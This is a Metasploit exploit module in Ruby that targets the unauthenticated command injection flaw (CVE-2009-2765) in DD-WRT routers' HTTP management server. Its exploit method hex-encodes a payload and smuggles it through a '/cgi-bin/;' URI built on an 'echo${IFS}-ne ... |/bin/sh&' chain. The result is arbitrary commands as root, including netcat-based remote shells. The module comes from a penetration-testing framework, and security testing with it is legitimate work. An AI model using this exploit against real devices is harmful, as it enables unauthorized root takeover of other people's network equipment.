##
# $Id: ddwrt_cgibin_exec.rb 9719 2010-07-07 17:38:59Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	HttpFingerprint = { :pattern => [ /DD-WRT/ ] }

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'DD-WRT HTTP Daemon Arbitrary Command Execution',
			'Description'    => %q{
					This module abuses a metacharacter injection vulnerability in the
				HTTP management server of wireless gateways running DD-WRT. This flaw
				allows an unauthenticated attacker to execute arbitrary commands as
				the root user account.
			},
			'Author'         => [ 'gat3way', 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9719 $',
			'References'     =>
				[
					[ 'CVE', '2009-2765' ],
					[ 'OSVDB', '55990' ],
					[ 'BID', '35742' ],
					[ 'URL', 'http://www.milw0rm.com/exploits/9209' ]
				],
			'Platform'       => ['unix'],
			'Arch'           => ARCH_CMD,
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'       => 1024,
					'DisableNops' => true,
					'Compat'      =>
						{
							'RequiredCmd' => 'generic netcat-e'
						}
				},
			'Targets'        =>
				[
					[ 'Automatic Target', { }]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jul 20 2009'
			))
	end

	def exploit

		cmd = payload.encoded.unpack("C*").map{|c| "\\x%.2x" % c}.join
		# TODO: force use of echo-ne CMD encoder
		str = "echo${IFS}-ne${IFS}\"#{cmd}\"|/bin/sh&"

		print_status("Sending GET request with encoded command line...")
		send_request_raw({ 'uri' => "/cgi-bin/;#{str}" })

		print_status("Giving the handler time to run...")
		handler

		select(nil, nil, nil, 10.0)
	end

end

